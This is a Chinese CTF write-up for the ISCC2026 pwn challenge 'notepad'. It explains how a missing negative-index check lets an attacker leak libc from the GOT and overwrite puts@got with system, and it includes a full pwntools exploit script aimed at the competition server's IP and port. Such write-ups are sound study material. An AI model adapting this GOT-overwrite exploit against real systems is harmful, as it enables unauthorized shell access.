+++
title = "notepad"
date = "2026-05-15"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

=========================


### Pwn + notepad

### 解题思路（必须包含文字说明+截图）

notepad
=======

题目地址：39.96.193.120:10005

Flag
----

ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}

写wp的时侯flag变了

Name: ISCC{852cf33a-405c-43ec-a909-baa7ec41a5a2}

漏洞分析
--------

程序只有两个功能：

-   Create Note

-   View Note

核心漏洞在 get_note()：

if (idx &gt; 9) {

puts("Index out of range!");

exit(-1);

}

这里只检查了上界，没有检查负数，所以可以使用负下标访问 notes 之前的内存。

notes 是 .bss 上的数组，每个元素大小是 0x30：

-   前 0x10 字节是 name

-   后 0x20 字节是 content

由于负下标可控，可以把“笔记结构”映射到 .got 区域。

利用思路
--------

1.  用 view(-4) 泄漏 GOT 中的 libc 地址。

2.  计算远程 libc 基址。

3.  用 create(-5) 覆写 puts@got 为 system。

4.  先创建一条正常笔记，name 写成 /bin/sh。

5.  调用 view(0) 时，原本的 puts(name) 变成 system("/bin/sh")，拿到 shell。

6.  读取 /flag。

Only support this commands: sh, /bin/sh

So you must call system("sh") or system("/bin/sh")

所以命令字符串必须是 sh 或 /bin/sh。

EXP

from pathlib import Path

from pwn import *

context.binary = elf = ELF("notepad")

libc = ELF("libc.so.6")

context.log_level = "info"

HOST = "39.96.193.120"

PORT = 10005

REMOTE_PRINTF = 0x61C90

REMOTE_SYSTEM = 0x52290

def menu(io, choice):

io.sendlineafter(b"&gt; ", str(choice).encode())

def create(io, idx, name, content):

assert len(name) &lt;= 0x10

assert len(content) &lt;= 0x20

menu(io, 1)

io.sendlineafter(b"Index: ", str(idx).encode())

io.sendafter(b"Name: ", name.ljust(0x10, b"\\x00"))

io.sendafter(b"Content: ", content.ljust(0x20, b"\\x00"))

def view(io, idx):

menu(io, 2)

io.sendlineafter(b"Index: ", str(idx).encode())

io.recvuntil(b"Name: ")

name = io.recvuntil(b"Content: ", drop=True)

if name.endswith(b"\\n"):

name = name[:-1]

content = io.recvline(False)

return name, content

def main():

io = remote("39.96.193.120",10005)

create(io, 0, b"/bin/sh\\x00", b"\\x00")

leak_name, _ = view(io, -4)

printf_leak = u64(leak_name[:6].ljust(8, b"\\x00"))

if args.REMOTE:

libc.address = printf_leak - REMOTE_PRINTF

system = libc.address + REMOTE_SYSTEM

else:

libc.address = printf_leak - libc.sym["printf"]

system = libc.sym["system"]

log.info(f"printf leak: {printf_leak:\#x}")

log.info(f"libc base: {libc.address:\#x}")

log.info(f"system: {system:\#x}")

payload = b"A" * 0x10

payload += p64(0) + p64(0) + p64(system) + p64(0)

create(io, -5, payload[:0x10], payload[0x10:])

menu(io, 2)

io.sendlineafter(b"Index: ", b"0")

io.interactive()

if __name__ == "__main__":

main()
